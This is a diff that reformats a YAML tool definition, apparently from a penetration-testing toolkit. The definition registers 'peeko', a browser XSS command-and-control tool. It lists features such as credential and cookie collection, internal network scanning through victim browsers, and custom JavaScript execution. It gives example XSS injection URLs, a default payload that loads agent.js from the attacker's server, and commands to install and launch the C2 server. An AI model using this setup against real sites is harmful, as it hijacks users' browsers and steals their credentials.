@@ -1,55 +1,38 @@
-name: "peeko"
-description: |
-  Browser-based XSS C2 tool that turns compromised browsers into internal network proxies.
-
-  Features:
-    - WebSocket-based C2 communication
-    - Internal network scanning through victim browsers
-    - Cross-origin request automation
-    - Credential/cookie collection
-    - File delivery system
-    - Custom JavaScript execution
-  
-  Usage:
-    peeko -u <target_url> [--inject <payload>]
-  
-  Examples:
-    1. Basic injection:
-       peeko -u https://vulnerable.site/xss?param=<script>
-    
-    2. With custom payload:
-       peeko -u https://target.com -i "<svg/onload=import()>"
-  
-  Security Notes:
-    - Requires initial XSS vector
-    - HTTPS recommended for WebSocket transport
-    - Self-signed certs supported via gen-cert.sh
-
-author: "b3rito @ mes3hacklab"
-version: "v1.1"
+name: peeko
+description: "Browser-based XSS C2 tool that turns compromised browsers into internal\
+  \ network proxies.\n\nFeatures:\n  - WebSocket-based C2 communication\n  - Internal\
+  \ network scanning through victim browsers\n  - Cross-origin request automation\n\
+  \  - Credential/cookie collection\n  - File delivery system\n  - Custom JavaScript\
+  \ execution\n\nUsage:\n  peeko -u <target_url> [--inject <payload>]\n\nExamples:\n\
+  \  1. Basic injection:\n     peeko -u https://vulnerable.site/xss?param=<script>\n\
+  \  \n  2. With custom payload:\n     peeko -u https://target.com -i \"<svg/onload=import()>\"\
+  \n\nSecurity Notes:\n  - Requires initial XSS vector\n  - HTTPS recommended for\
+  \ WebSocket transport\n  - Self-signed certs supported via gen-cert.sh\n"
+author: b3rito @ mes3hacklab
+version: v1.1
 enabled: true
 params:
-  - name: "url"
-    type: string
-    required: true
-    description: "Initial XSS injection point URL"
-  
-  - name: "payload"
-    type: string
-    required: false
-    default: "<script src='{server}/static/agent.js'></script>"
-    description: "Custom XSS payload (uses {server} placeholder)"
-
-  - name: "rhost"
-    type: string
-    required: true
-    description: "IP/Domain of C2 server (e.g., 192.168.1.100)"
-install_type: "git" 
+- name: url
+  type: string
+  required: true
+  description: Initial XSS injection point URL
+- name: payload
+  type: string
+  required: false
+  default: <script src='{server}/static/agent.js'></script>
+  description: Custom XSS payload (uses {server} placeholder)
+- name: rhost
+  type: string
+  required: true
+  description: IP/Domain of C2 server (e.g., 192.168.1.100)
+install_type: git
 tool:
-  name: "peeko"
-  repo_url: "https://github.com/b3rito/peeko.git"
-  install_path: "external/.exploit/peeko"
-  install_command: "make install && make cert"
-  execute_command: |
-    sed -i 's/SERVER-IP/{rhost}/g' static/agent.js static/control.html &&
-    python3 main.py --host 0.0.0.0 --port 8443
+  name: peeko
+  repo_url: https://github.com/b3rito/peeko.git
+  install_path: external/.exploit/peeko
+  install_command: make install && make cert
+  execute_command: 'sed -i ''s/SERVER-IP/{rhost}/g'' static/agent.js static/control.html
+    &&
+
+    python3 main.py --host 0.0.0.0 --port 8443'
+category: 02. Scanning & Enumeration
